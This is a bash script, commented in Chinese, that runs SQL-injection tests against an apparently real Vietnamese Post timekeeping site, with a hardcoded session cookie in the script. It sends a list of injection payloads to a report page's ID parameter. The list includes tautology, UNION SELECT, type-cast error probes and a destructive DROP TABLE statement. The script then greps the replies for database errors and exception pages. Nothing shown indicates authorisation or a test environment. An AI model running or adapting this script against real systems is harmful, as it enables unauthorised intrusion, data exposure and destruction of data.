#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 深度检查：查找真实SQL错误"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试各种payload，详细检查整个HTML
PAYLOADS=(
    "MAU2'"
    "MAU2''"  
    "MAU2' OR 1=1--"
    "MAU2' AND 1=2--"
    "MAU2' UNION SELECT NULL--"
    "MAU2' AND 1=CAST('a' AS INT)--"
    "MAU2'; DROP TABLE test--"
)

for payload in "${PAYLOADS[@]}"; do
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🔍 Payload: $payload"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    encoded=$(echo "$payload" | sed 's/ /%20/g;s/'\''/%27/g;s/;/%3B/g;s/=/%3D/g;s/--/%2D%2D/g')
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${encoded}" \
        -H "Cookie: $COOKIE" \
        > "detailed_$(echo $payload | md5sum | cut -d' ' -f1).html" 2>&1
    
    filename="detailed_$(echo $payload | md5sum | cut -d' ' -f1).html"
    
    # 完整搜索SQL相关错误
    echo "[检查SQL错误关键词...]"
    
    # 方法1：直接grep SQL错误
    if grep -qi "SQL Server\|MySQL\|Oracle\|syntax error\|near\|unexpected" "$filename"; then
        echo "  🔥🔥🔥 发现SQL错误信息!"
        grep -i "SQL Server\|MySQL\|Oracle\|syntax error\|near\|unexpected" "$filename"
    fi
    
    # 方法2：检查异常信息
    if grep -qi "Exception\|Error\|Stack Trace" "$filename"; then
        echo "  ⚠️  发现异常信息"
        grep -A 5 "Exception\|Error" "$filename" | head -20
    fi
    
    # 方法3：检查是否返回500错误页面
    if grep -qi "Server Error\|HttpUnhandledException\|ArgumentException" "$filename"; then
        echo "  ⚠️  返回500错误页面"
        grep -A 3 "Server Error\|Exception Details" "$filename" | head -10
    fi
    
    # 方法4：提取title
    title=$(grep -oE "<title>.*</title>" "$filename" | head -1)
    if [ -n "$title" ]; then
        echo "  Title: $title"
    fi
    
    # 方法5：文件大小
    size=$(wc -c < "$filename")
    echo "  大小: $size bytes"
    
    # 如果响应很大（>6000），可能是详细错误页面
    if [ $size -gt 6000 ]; then
        echo "  🔥 响应异常大，检查完整内容..."
        echo "  前200行:"
        head -200 "$filename"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 总结"
